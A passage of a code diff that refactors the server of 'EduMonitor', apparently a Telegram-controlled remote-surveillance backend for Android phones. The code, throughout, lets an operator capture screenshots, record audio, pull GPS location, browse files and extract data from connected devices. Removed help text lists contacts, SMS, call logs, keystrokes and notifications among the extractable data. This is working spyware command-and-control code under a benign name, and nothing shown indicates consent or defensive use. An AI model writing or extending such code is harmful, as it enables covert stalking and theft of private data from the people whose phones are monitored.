-        }
-        else if (data.startsWith('battery_')) {
-            const deviceId = data.substring(8);
-            await getBatteryStatus(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('network_')) {
-            const deviceId = data.substring(8);
-            await getNetworkInfo(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('storage_')) {
-            const deviceId = data.substring(8);
-            await getStorageInfo(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('info_')) {
-            const deviceId = data.substring(5);
-            await getDeviceInfo(chatId, messageId, deviceId);
-        }
-    } catch (error) {
-        console.error('Error in callback handler:', error);
+    if (handlers[data]) {
+        await handlers[data]();
+    } else if (data.startsWith('device_')) {
+        await showDeviceDetails(chatId, messageId, data.substring(7));
+    } else if (data.startsWith('screenshot_')) {
+        await takeScreenshot(chatId, messageId, data.substring(11));
+    } else if (data.startsWith('record_')) {
+        const parts = data.split('_');
+        await startRecording(chatId, messageId, parts.slice(2).join('_'), parseInt(parts[1]));
+    } else if (data.startsWith('location_')) {
+        await getLocation(chatId, messageId, data.substring(9));
+    } else if (data.startsWith('files_')) {
+        await listFiles(chatId, messageId, data.substring(6));
+    } else if (data.startsWith('battery_')) {
+        await getBatteryStatus(chatId, messageId, data.substring(8));
+    } else if (data.startsWith('network_')) {
+        await getNetworkInfo(chatId, messageId, data.substring(8));
+    } else if (data.startsWith('storage_')) {
+        await getStorageInfo(chatId, messageId, data.substring(8));
+    } else if (data.startsWith('info_')) {
+        await getDeviceInfo(chatId, messageId, data.substring(5));
     }
 }
 
 // ============================================
-// MENU DISPLAY FUNCTIONS
+// MENU FUNCTIONS
 // ============================================
 async function showDevicesMenu(chatId, messageId) {
     db.all('SELECT * FROM devices WHERE is_active = 1 ORDER BY last_seen DESC', [], async (err, devices) => {
-        if (err) {
-            await editMessageText(chatId, messageId, '❌ Error fetching devices');
-            return;
-        }
+        if (err) return await editMessageText(chatId, messageId, '❌ Error fetching devices');
 
-        if (!devices || devices.length === 0) {
-            await editMessageText(chatId, messageId,
+        if (!devices?.length) {
+            return await editMessageText(chatId, messageId,
                 '📭 *No Devices Connected*\n\nNo devices are currently connected.',
                 [[{ text: '🔄 REFRESH', callback_data: 'menu_devices' }, 
-                  { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
-            );
-            return;
+                  { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
         }
 
-        const text = `📱 *Connected Devices (${devices.length})*\n\nSelect a device to control:`;
-        await editMessageText(chatId, messageId, text, DevicesMenuKeyboard(devices));
+        await editMessageText(chatId, messageId,
+            `📱 *Connected Devices (${devices.length})*\n\nSelect a device to control:`,
+            DevicesMenuKeyboard(devices));
     });
 }
 
 async function showDeviceDetails(chatId, messageId, deviceId) {
     db.get('SELECT * FROM devices WHERE id = ?', [deviceId], async (err, device) => {
         if (err || !device) {
-            await editMessageText(chatId, messageId,
+            return await editMessageText(chatId, messageId,
                 '❌ *Device Not Found*',
-                [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]]
-            );
-            return;
+                [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]]);
         }
 
-        const lastSeen = new Date(device.last_seen).toLocaleString();
-        const batteryEmoji = getBatteryEmoji(device.battery_level);
-
-        const text = 
-            `📱 *Device Details*\n\n` +
-            `*Model:* ${device.model || 'Unknown'}\n` +
+        await editMessageText(chatId, messageId,
+            `📱 *Device Details*\n\n*Model:* ${device.model || 'Unknown'}\n` +
             `*Android:* ${device.android_version || 'Unknown'}\n` +
-            `*Battery:* ${batteryEmoji} ${device.battery_level || '?'}%\n` +
-            `*Last Seen:* ${lastSeen}\n\n` +
-            `*Select an action:*`;
-
-        await editMessageText(chatId, messageId, text, DeviceActionKeyboard(deviceId));
+            `*Battery:* ${getBatteryEmoji(device.battery_level)} ${device.battery_level || '?'}%\n` +
+            `*Last Seen:* ${new Date(device.last_seen).toLocaleString()}\n\n*Select an action:*`,
+            DeviceActionKeyboard(deviceId));
     });
 }
 
 async function showScreenshotMenu(chatId, messageId) {
     db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
-        if (err || !devices || devices.length === 0) {
-            editMessageText(chatId, messageId,
+        if (err || !devices?.length) {
+            return editMessageText(chatId, messageId,
                 '📭 *No Devices Connected*',
-                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
-            );
-            return;
+                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
         }
 
-        const keyboard = [];
-        devices.forEach(device => {
-            keyboard.push([{ 
-                text: `📸 ${device.model || 'Unknown'}`, 
-                callback_data: `screenshot_${device.id}` 
-            }]);
-        });
+        const keyboard = devices.map(device => 
+            [{ text: `📸 ${device.model || 'Unknown'}`, callback_data: `screenshot_${device.id}` }]
+        );
         keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
 
         editMessageText(chatId, messageId,
-            '📸 *Screenshot Menu*\n\nSelect a device to capture screen:',
-            keyboard
-        );
+            '📸 *Screenshot Menu*\n\nSelect a device to capture screen:', keyboard);
     });
 }
 
 async function showRecordingMenu(chatId, messageId) {
     db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
-        if (err || !devices || devices.length === 0) {
-            editMessageText(chatId, messageId,
+        if (err || !devices?.length) {
+            return editMessageText(chatId, messageId,
                 '📭 *No Devices Connected*',
-                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
-            );
-            return;
+                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
         }
 
         const keyboard = [];
@@ -1146,242 +888,160 @@ async function showRecordingMenu(chatId, messageId) {
         keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
 
         editMessageText(chatId, messageId,
-            '🎤 *Recording Menu*\n\nSelect a device and duration:',
-            keyboard
-        );
+            '🎤 *Recording Menu*\n\nSelect a device and duration:', keyboard);
     });
 }
 
 async function showLocationMenu(chatId, messageId) {
     db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
-        if (err || !devices || devices.length === 0) {
-            editMessageText(chatId, messageId,
+        if (err || !devices?.length) {
+            return editMessageText(chatId, messageId,
                 '📭 *No Devices Connected*',
-                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
-            );
-            return;
+                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
         }
 
-        const keyboard = [];
-        devices.forEach(device => {
-            keyboard.push([{ 
-                text: `📍 ${device.model || 'Unknown'}`, 
-                callback_data: `location_${device.id}` 
-            }]);
-        });
+        const keyboard = devices.map(device => 
+            [{ text: `📍 ${device.model || 'Unknown'}`, callback_data: `location_${device.id}` }]
+        );
         keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
 
         editMessageText(chatId, messageId,
-            '📍 *Location Menu*\n\nSelect a device to get current location:',
-            keyboard
-        );
+            '📍 *Location Menu*\n\nSelect a device to get current location:', keyboard);
     });
 }
 
 async function showFilesMenu(chatId, messageId) {
     db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
-        if (err || !devices || devices.length === 0) {
-            editMessageText(chatId, messageId,
+        if (err || !devices?.length) {
+            return editMessageText(chatId, messageId,
                 '📭 *No Devices Connected*',
-                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
-            );
-            return;
+                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
         }
 
-        const keyboard = [];
-        devices.forEach(device => {
-            keyboard.push([{ 
-                text: `📁 ${device.model || 'Unknown'}`, 
-                callback_data: `files_${device.id}` 
-            }]);
-        });
+        const keyboard = devices.map(device => 
+            [{ text: `📁 ${device.model || 'Unknown'}`, callback_data: `files_${device.id}` }]
+        );
         keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
 
         editMessageText(chatId, messageId,
-            '📁 *File Explorer*\n\nSelect a device to browse files:',
-            keyboard
-        );
+            '📁 *File Explorer*\n\nSelect a device to browse files:', keyboard);
     });
 }
 
 async function showDataExtractionMenu(chatId, messageId) {
     db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
-        if (err || !devices || devices.length === 0) {
-            editMessageText(chatId, messageId,
+        if (err || !devices?.length) {
+            return editMessageText(chatId, messageId,
                 '📭 *No Devices Connected*',
-                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
-            );
-            return;
+                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
         }
 
         if (devices.length === 1) {
-            const device = devices[0];
-            editMessageText(chatId, messageId,
-                `📊 *Data Extraction - ${device.model || 'Unknown'}*\n\nSelect data type to extract:`,
-                DataExtractionKeyboard(device.id)
-            );
-            return;
+            return editMessageText(chatId, messageId,
+                `📊 *Data Extraction - ${devices[0].model || 'Unknown'}*\n\nSelect data type to extract:`,
+                DataExtractionKeyboard(devices[0].id));
         }
 
-        const keyboard = [];
-        devices.forEach(device => {
-            keyboard.push([{ 
-                text: `📊 ${device.model || 'Unknown'}`, 
-                callback_data: `data_device_${device.id}` 
-            }]);
-        });
+        const keyboard = devices.map(device => 
+            [{ text: `📊 ${device.model || 'Unknown'}`, callback_data: `data_device_${device.id}` }]
+        );
         keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
 
         editMessageText(chatId, messageId,
-            '📊 *Data Extraction*\n\nSelect a device:',
-            keyboard
-        );
+            '📊 *Data Extraction*\n\nSelect a device:', keyboard);
     });
 }
 
 async function showHelpMenu(chatId, messageId) {
-    const helpText = 
-        '❓ *EduMonitor Help*\n\n' +
-        '*Available Commands:*\n' +
-        '• /start - Show main menu\n' +
-        '• /devices - List all devices\n\n' +
-        '*Features:*\n' +
-        '• 📸 Screenshot capture\n' +
-        '• 🎤 Audio recording\n' +
-        '• 📍 GPS location tracking\n' +
-        '• 📁 File explorer\n' +
-        '• 📊 Data extraction (Contacts, SMS, Call Logs, Apps, Keystrokes, Notifications)\n' +
-        '• 🔋 Battery monitoring\n' +
-        '• 📡 Network information\n' +
-        '• 💾 Storage information';
-
-    await editMessageText(chatId, messageId, helpText, [
-        [{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]
-    ]);
+    await editMessageText(chatId, messageId,
+        '❓ *EduMonitor Help*\n\n*Available Commands:*\n• /start - Show main menu\n• /devices - List all devices\n\n*Features:*\n• 📸 Screenshot capture\n• 🎤 Audio recording\n• 📍 GPS location tracking\n• 📁 File explorer\n• 📊 Data extraction\n• 🔋 Battery monitoring\n• 📡 Network information\n• 💾 Storage information',
+        [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
 }
 
 // ============================================
-// COMMAND EXECUTION FUNCTIONS
+// COMMAND FUNCTIONS
 // ============================================
 async function takeScreenshot(chatId, messageId, deviceId) {
     await editMessageText(chatId, messageId,
         `📸 *Taking Screenshot*\n\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
+        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);
 
-    const result = deviceManager.sendCommand(deviceId, 'take_screenshot', {}, (success, data, error) => {
-        if (success) {
-            editMessageText(chatId, messageId,
-                `✅ *Screenshot captured successfully!*`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        } else {
-            editMessageText(chatId, messageId,
-                `❌ *Screenshot Failed*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        }
+    const result = deviceManager.sendCommand(deviceId, 'take_screenshot', {}, (success) => {
+        editMessageText(chatId, messageId,
+            success ? `✅ *Screenshot captured successfully!*` : `❌ *Screenshot Failed*`,
+            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
     });
 
     if (!result.success) {
         await editMessageText(chatId, messageId,
             `❌ *Failed to send command*\n\nDevice may be offline.`,
-            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-        );
+            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
     }
 }
 
 async function startRecording(chatId, messageId, deviceId, seconds) {
     await editMessageText(chatId, messageId,
         `🎤 *Starting Recording*\n\nDuration: ${seconds}s\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
+        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);
 
-    const result = deviceManager.sendCommand(deviceId, 'record_audio', { seconds }, (success, data, error) => {
-        if (success) {
-            editMessageText(chatId, messageId,
-                `✅ *Recording completed!*`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        } else {
-            editMessageText(chatId, messageId,
-                `❌ *Recording Failed*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        }
+    const result = deviceManager.sendCommand(deviceId, 'record_audio', { seconds }, (success) => {
+        editMessageText(chatId, messageId,
+            success ? `✅ *Recording completed!*` : `❌ *Recording Failed*`,
+            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
     });
 
     if (!result.success) {
         await editMessageText(chatId, messageId,
             `❌ *Failed to send command*\n\nDevice may be offline.`,
-            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-        );
+            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
     }
 }
 
 async function getLocation(chatId, messageId, deviceId) {
     await editMessageText(chatId, messageId,
         `📍 *Getting Location*\n\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
+        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);
 
-    const result = deviceManager.sendCommand(deviceId, 'get_location', {}, (success, data, error) => {
+    const result = deviceManager.sendCommand(deviceId, 'get_location', {}, (success, data) => {
         if (success && data) {
             const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
-            const message = 
-                `📍 *Location Received*\n\n` +
-                `Lat: \`${data.lat}\`\n` +
-                `Lon: \`${data.lon}\`\n` +
-                `Accuracy: ±${data.accuracy}m\n` +
-                `Provider: ${data.provider}\n\n` +
-                `[View on Google Maps](${mapsUrl})`;
-            
-            editMessageText(chatId, messageId, message,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+            editMessageText(chatId, messageId,
+                `📍 *Location Received*\n\nLat: \`${data.lat}\`\nLon: \`${data.lon}\`\n` +
+                `Accuracy: ±${data.accuracy}m\nProvider: ${data.provider}\n\n` +
+                `[View on Google Maps](${mapsUrl})`,
+                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         } else {
             editMessageText(chatId, messageId,
-                `❌ *Location Failed*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+                `❌ *Location Failed*`,
+                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         }
     });
 
     if (!result.success) {
         await editMessageText(chatId, messageId,
-            `❌ *Failed to send command*\n\nDevice may be offline.`,
-            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-        );
+            `❌ *Failed to send command*`,
+            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
     }
 }
 
 async function listFiles(chatId, messageId, deviceId) {
     await editMessageText(chatId, messageId,
         `📁 *Listing Files*\n\nDefault path: /sdcard\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
-    
-    const defaultPath = '/sdcard';
-    
-    const result = deviceManager.sendCommand(deviceId, 'list_files', { path: defaultPath }, (success, data, error) => {
+        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);
+
+    deviceManager.sendCommand(deviceId, 'list_files', { path: '/sdcard' }, (success, data) => {
         if (success && data.files) {
-            let fileList = `📁 *Files in ${data.path || defaultPath}*\n\n`;
+            let fileList = `📁 *Files in ${data.path || '/sdcard'}*\n\n`;
             data.files.slice(0, 20).forEach(f => {
-                const icon = f.isDirectory ? '📁' : '📄';
-                const size = f.size ? ` (${formatFileSize(f.size)})` : '';
-                fileList += `${icon} ${f.name}${size}\n`;
+                fileList += `${f.isDirectory ? '📁' : '📄'} ${f.name}${f.size ? ` (${formatFileSize(f.size)})` : ''}\n`;
             });
-            if (data.files.length > 20) {
-                fileList += `\n... and ${data.files.length - 20} more`;
-            }
+            if (data.files.length > 20) fileList += `\n... and ${data.files.length - 20} more`;
             editMessageText(chatId, messageId, fileList,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         } else {
             editMessageText(chatId, messageId,
-                `❌ *Failed to list files*\n\nError: ${error || 'Access denied'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+                `❌ *Failed to list files*`,
+                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         }
     });
 }
@@ -1389,52 +1049,41 @@ async function listFiles(chatId, messageId, deviceId) {
 async function getBatteryStatus(chatId, messageId, deviceId) {
     db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
         if (err || !device) {
-            editMessageText(chatId, messageId,
+            return editMessageText(chatId, messageId,
                 '❌ *Device Not Found*',
-                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]
-            );
-            return;
+                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]);
         }
 
-        const batteryEmoji = getBatteryEmoji(device.battery_level);
-        const message = 
+        editMessageText(chatId, messageId,
             `🔋 *Battery Status - ${device.model || 'Unknown'}*\n\n` +
-            `Level: ${batteryEmoji} ${device.battery_level || '?'}%\n` +
-            `Last Updated: ${new Date(device.last_seen).toLocaleString()}`;
-
-        editMessageText(chatId, messageId, message,
+            `Level: ${getBatteryEmoji(device.battery_level)} ${device.battery_level || '?'}%\n` +
+            `Last Updated: ${new Date(device.last_seen).toLocaleString()}`,
             [[{ text: '🔄 REFRESH', callback_data: `battery_${deviceId}` }, 
-              { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-        );
+              { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
     });
 }
 
 async function getNetworkInfo(chatId, messageId, deviceId) {
     await editMessageText(chatId, messageId,
         `📡 *Getting Network Info*\n\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
+        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);
 
-    const result = deviceManager.sendCommand(deviceId, 'get_network_info', {}, (success, data, error) => {
+    deviceManager.sendCommand(deviceId, 'get_network_info', {}, (success, data) => {
         if (success) {
             let message = `📡 *Network Info*\n\n`;
             if (data.connected) {
-                message += `Status: ✅ Connected\n`;
-                message += `Type: ${data.type}\n`;
+                message += `Status: ✅ Connected\nType: ${data.type}\n`;
                 if (data.ssid) message += `WiFi: ${data.ssid}\n`;
                 if (data.ip) message += `IP: ${data.ip}\n`;
-            } else {
-                message += `Status: ❌ Disconnected\n`;
-            }
+            } else message += `Status: ❌ Disconnected\n`;
+            
             editMessageText(chatId, messageId, message,
                 [[{ text: '🔄 REFRESH', callback_data: `network_${deviceId}` }, 
-                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         } else {
             editMessageText(chatId, messageId,
-                `❌ *Failed to get network info*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+                `❌ *Failed to get network info*`,
+                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         }
     });
 }
@@ -1442,10 +1091,9 @@ async function getNetworkInfo(chatId, messageId, deviceId) {
 async function getStorageInfo(chatId, messageId, deviceId) {
     await editMessageText(chatId, messageId,
         `💾 *Getting Storage Info*\n\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
+        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);
 
-    const result = deviceManager.sendCommand(deviceId, 'get_storage_info', {}, (success, data, error) => {
+    deviceManager.sendCommand(deviceId, 'get_storage_info', {}, (success, data) => {
         if (success) {
             let message = `💾 *Storage Info*\n\n`;
             if (data.internal_total) {
@@ -1464,13 +1112,11 @@ async function getStorageInfo(chatId, messageId, deviceId) {
             }
             editMessageText(chatId, messageId, message,
                 [[{ text: '🔄 REFRESH', callback_data: `storage_${deviceId}` }, 
-                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         } else {
             editMessageText(chatId, messageId,
-                `❌ *Failed to get storage info*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
+                `❌ *Failed to get storage info*`,
+                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
         }
     });
 }
@@ -1478,25 +1124,19 @@ async function getStorageInfo(chatId, messageId, deviceId) {
 async function getDeviceInfo(chatId, messageId, deviceId) {
     db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
         if (err || !device) {
-            editMessageText(chatId, messageId,
+            return editMessageText(chatId, messageId,
                 '❌ *Device Not Found*',
-                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]
-            );
-            return;
+                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]);
         }
 
-        const message = 
-            `ℹ️ *Device Information*\n\n` +
-            `*Model:* ${device.model || 'Unknown'}\n` +
+        editMessageText(chatId, messageId,
+            `ℹ️ *Device Information*\n\n*Model:* ${device.model || 'Unknown'}\n` +
             `*Android:* ${device.android_version || 'Unknown'}\n` +
             `*Manufacturer:* ${device.manufacturer || 'Unknown'}\n` +
             `*Device ID:* \`${device.id}\`\n` +
             `*Registered:* ${new Date(device.registered_at).toLocaleString()}\n` +
-            `*Last Seen:* ${new Date(device.last_seen).toLocaleString()}`;
-
-        editMessageText(chatId, messageId, message,
-            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-        );
+            `*Last Seen:* ${new Date(device.last_seen).toLocaleString()}`,
+            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
     });
 }
 
@@ -1525,14 +1165,9 @@ schedule.scheduleJob('0 0 * * *', () => {
     const cutoff = Date.now() - config.storage.retentionDays * 24 * 60 * 60 * 1000;
     
     db.all('SELECT file_path FROM media WHERE timestamp < ?', [cutoff], (err, media) => {
-        if (err || !media) return;
-        media.forEach(item => {
-            try {
-                if (item.file_path && fs.existsSync(item.file_path)) {
-                    fs.unlinkSync(item.file_path);
-                }
-            } catch (error) {
-                console.error('Cleanup error:', error);
+        media?.forEach(item => {
+            if (item.file_path && fs.existsSync(item.file_path)) {
+                fs.unlinkSync(item.file_path);
             }
         });
     });
@@ -1544,22 +1179,15 @@ schedule.scheduleJob('0 0 * * *', () => {
 });
 
 // ============================================
-// 404 HANDLER
+// ERROR HANDLING
 // ============================================
 app.use((req, res) => {
-    res.status(404).json({ 
-        error: 'Endpoint not found',
-        path: req.url
-    });
+    res.status(404).json({ error: 'Endpoint not found' });
 });
 
-// Error handler
 app.use((err, req, res, next) => {
     console.error('Server error:', err.stack);
-    res.status(500).json({ 
-        error: 'Internal server error', 
-        message: err.message 
-    });
+    res.status(500).json({ error: 'Internal server error' });
 });
 
 // ============================================
@@ -1571,29 +1199,20 @@ if (!fs.existsSync('uploads')) {
 
 server.listen(config.server.port, config.server.host, () => {
     console.log('\n🚀 ===============================================');
-    console.log(`🚀 EduMonitor v3.0 - Server Started`);
+    console.log(`🚀 EduMonitor Server Started`);
     console.log(`🚀 ===============================================`);
-    console.log(`\n📡 HTTP Server: http://${config.server.host}:${config.server.port}`);
+    console.log(`\n📡 HTTP: http://${config.server.host}:${config.server.port}`);
     console.log(`🔌 WebSocket: ws://${config.server.host}:${config.server.port}/ws`);
-    
+    console.log(`📊 Database: SQLite`);
     setWebhook();
-
-    console.log(`\n✅ Features:`);
-    console.log(`   └─ WebSocket (Primary)`);
-    console.log(`   └─ HTTP (Registration/Uploads)`);
-    console.log(`   └─ Full Data Collection`);
-    console.log(`   └─ File Upload & Processing`);
-    console.log(`   └─ Device Management`);
-    console.log(`   └─ Auto Cleanup`);
-    console.log(`\n🚀 ===============================================\n`);
+    console.log(`\n✅ Server ready\n`);
 });
 
-// Graceful shutdown
 process.on('SIGTERM', shutdown);
 process.on('SIGINT', shutdown);
 
 function shutdown() {
-    console.log('\n🛑 Shutting down gracefully...');
+    console.log('\n🛑 Shutting down...');
     deviceManager.broadcastToDevices({ type: 'shutdown', timestamp: Date.now() });
     wss.close();
     server.close(() => {
